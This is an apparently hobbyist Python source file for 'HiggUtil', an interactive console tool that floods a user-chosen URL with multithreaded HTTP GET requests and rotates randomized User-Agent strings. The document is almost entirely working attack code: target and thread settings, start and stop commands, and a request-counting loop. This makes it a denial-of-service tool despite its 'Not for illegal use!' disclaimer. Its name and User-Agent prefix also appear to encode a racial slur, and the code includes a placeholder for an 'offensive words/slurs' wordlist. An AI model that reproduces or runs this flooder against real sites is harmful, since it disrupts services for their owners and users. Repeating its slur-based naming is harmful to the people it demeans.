import os
from timeit import default_timer as timer
from datetime import timedelta
import time
import requests
import threading
import random

print("HIGGERSutility - HiggUtil - Version 1.0 'Cold Mountains' - cablesalty")

class settings:
    userset_uarand = True
    userset_useragent = False

    uarand = "words"
    wordlist = [
        "Preview",
        "WATAPP",
        "Muzsika",
        "Grapefruit",
        "GEEARS",
        "WORP",
        "LLO",
        "eyeMessages",
        "Arcs",
        "Binbows",
        "Launchpad",
        "Finder",
        "Case",
        "ZDNG",
        "Opera Singer",
        "TemuSpeak",
        "TeamSpeka",
        "Discoid",
        "DISCORDO",
        "Weather Station",
        "Events",
        "Sticky Notes",
        "iTERM",
        "Terminal",
        "Docking Station",
        "Security Camera",
        "Smart Plug",
        "Smart Bulb",
        "Movement Sensor",
        "Light Sensor",
        "EkisCode",
    ]

    offensivewordlist = [
        # Will do later
    ]
    useragent = ""

    targetthreads = 1
    threads = []

    reqmade = 0
    running = False
    target = ""

print("""
_   _ ___ ____  ____ _____ ____  ____        _   _ _ _ _         
| | | |_ _/ ___|/ ___| ____|  _ \\/ ___| _   _| |_(_) (_) |_ _   _ 
| |_| || | |  _| |  _|  _| | |_) \\___ \\| | | | __| | | | __| | | |
|  _  || | |_| | |_| | |___|  _ < ___) | |_| | |_| | | | |_| |_| |
|_| |_|___\\____|\\____|_____|_| \\_\\____/ \\__,_|\\__|_|_|_|\\__|\\__, |
                                                             |___/
""")
print("Request spammer with UA changer")
print("Made by: cablesalty // Not for illegal use!")
print()
print("To view changelog, type 'changelog latest' or 'changelog all'")
print("To see what you can do, type 'guide' or 'help'")
print()

def reqattack(target, stop_event):
    while not stop_event.is_set():
        useragent = ""
        if settings.userset_useragent:
            useragent = settings.useragent
        elif settings.uarand == "words":
            useragent ="Higgers " + random.choice(settings.wordlist)
        elif settings.uarand == "num":
            useragent = "Higgers " + str(random.randrange(11111, 99999))
        else:
            useragent = "Higgers " + random.choice(settings.wordlist)
            
        header = {
            "User-Agent": useragent
        }

        requests.get(target, headers=header)
        settings.reqmade += 1

while True:
    if settings.running:
        cmd = input("RUNNING :: HiggUtil>> ")
    else:
        cmd = input("STOPPED :: HiggUtil>> ")

    start = time.monotonic_ns()
    successful = True

    if cmd == "":
        pass

    elif cmd.startswith("changelog"):
        print("Reading changelog...")
        with open("changelog", "r") as f:
            print()
            changelog = f.read()
            f.close()
        print(changelog)
        print()

    elif cmd.startswith("uarand"):
        overwrite_protection = True
        try:
            mode = cmd.split(" ")[1]
        except IndexError:
            mode = ""

        if mode == "":
            overwrite_protection = False
            print("Value: " + settings.uarand)
        # elif mode == "randomchar" or mode == "randchar":
        #     settings.uarand = "randchar"
        #     print("Set User Agent Randomizer to Random Characters")
        elif mode == "numbers" or mode == "nums":
            settings.uarand = "nums"
            print("Set User Agent Randomizer to Random Numbers")
        elif mode == "words":
            settings.uarand = "words"
            print("Set User Agent Randomizer to Words")
        elif mode == "offensive":
            # settings.uarand = "offensive"
            # print("Set User Agent Randomizer to Offensive Words/Slurs")
            settings.uarand = "words"
            print("!! WARNING !! Set User Agent Randomizer to Words (Offensive wordlist unavailable)")
        else:
            print("!!! ERROR !!! ILLEGAL option!")
            successful = False

        if overwrite_protection and successful and settings.userset_useragent:
            settings.useragent = ""
            settings.userset_useragent = False
            print("!! WARNING !! Static User Agent String OVERWRITTEN by User Agent Randomizer")

    elif cmd.startswith("useragent"):
        overwrite_protection = True
        try:
            value = ""
            if len(cmd.split(" ")) > 1:
                for cvalue in cmd.split(" "):
                    value = value + cvalue + " "
                value = value.strip()
        except IndexError:
            value = ""

        if value == "":
            overwrite_protection = False
            print("Value: " + settings.useragent)
        else:
            settings.useragent = value
            print("Set Static User Agent String to " + value)

        if overwrite_protection and successful and settings.userset_uarand:
            settings.uarand = ""
            settings.userset_uarand = False
            print("!! WARNING !! User Agent Randomizer OVERWRITTEN by Static User Agent String")

    elif cmd.startswith("threads"):
        try:
            target = cmd.split(" ")[1]
        except IndexError:
            target = ""

        if target == "":
            print("Value: " + str(settings.targetthreads) + " (" + str(len(settings.threads)) + " currently open)")
        else:
            settings.targetthreads = int(target)
            print("Set Thread Target to " + target)

        if settings.running and not target == "":
            print("A job is running to update running threads (match target threads) (wait a long time...)")

    elif cmd.startswith("target"):
        try:
            target = cmd.split(" ")[1]
        except IndexError:
            target = ""

        if target == "":
            print("Value: " + str(settings.targetthreads))
        else:
            settings.target = target
            print("Set Target to " + target)
    
    elif cmd == "status":
        print("Attack Status and Statistics:")
        if settings.running:
            print("Attack *RUNNING*")
            print("Open threads: " + str(len(settings.threads)) + " (target " + str(settings.targetthreads) + ")")
            print("Requests made so far: " + str(settings.reqmade))
        else:
            print("Attack *STOPPED*")

    elif cmd == "start":
        check_success = True
        print("=! STATUS REPORT != Attempting to launch attack...")
        print()
        print("Applied settings:")
        if settings.userset_uarand and settings.userset_useragent:
            check_success = False
            print("!!! ERROR !!! Failed to get User Agent type: Option cannot be both.")
        elif settings.userset_uarand:
            print("Use Randomized User Agent")
            print("User Agent Randomizer Mode: " + settings.uarand)
        elif settings.userset_useragent:
            print("Use Static User Agent String")
            print("User Agent String: " + settings.useragent)
        else:
            check_success = False
            print("!!! ERROR !!! Failed to get User Agent type: ILLEGAL selection.")

        if settings.targetthreads > 0:
            print("Target Threads: " + str(settings.targetthreads))
        else:
            check_success = False
            print("!!! ERROR !!! Target threads cannot be zero or negative.")
        
        if not settings.target == "":
            print("Target: " + settings.target)
        else:
            check_success = False
            print("!!! ERROR !!! No target selected.")

        if settings.running:
            check_success = False
            print("!!! ERROR !!! Attack already running.")

        print()

        if check_success == False:
            successful = False
            print("!!! ERROR !!! Failed to launch attack (settings check failed)")
        else:
            print("Composing threads (wait a long time...)")

            print("Setting up stop flag...")
            stop_event = threading.Event()

            for i in range(settings.targetthreads):
                print("Creating thread " + str(i) + " and adding to thread list...")
                x = threading.Thread(target=reqattack, args=(settings.target, stop_event,))
                settings.threads.append(x)

            print("Launching threads (wait a long time...)")
            for i in range(len(settings.threads)):
                print("Starting thread " + str(i) + "...")
                settings.threads[i].start()

            settings.running = True            
            print("!!!! Started attack !!!!")
    elif cmd == "stop":
        if settings.running:
            print("=! STATUS REPORT != Stopping attack...")
            print()
            print("Setting stop flag...")
            stop_event.set()
            print("Waiting for threads... (wait a long time...)")
            for thread in settings.threads:
                thread.join()
            print("Clearing thread list...")
            settings.threads = []
            settings.running = False
            print("Stopped attack!")
            print()
            print("Statistics:")
            print("Requests made in attack lifetime: " + str(settings.reqmade))
            print("Target threads: " + str(settings.targetthreads))
            print("Target: " + settings.target)
            print()
            print("Cleaning up...")
            settings.reqmade = 0
        else:
            successful = False
            print("!!! ERROR !!! Failed to stop attack (not currently attacking)")

    else:
        successful = False
        print("Non-existent command '" + cmd.split(" ")[0] + "'")

    end = time.monotonic_ns()
    if not cmd == "":
        print()
        if successful:
            print("Operation completed successfully, took " + str(end - start) + " nanoseconds (might be invalid)")
        else:
            print("Operation FAILED, took " + str(end - start) + " nanoseconds (might be invalid)")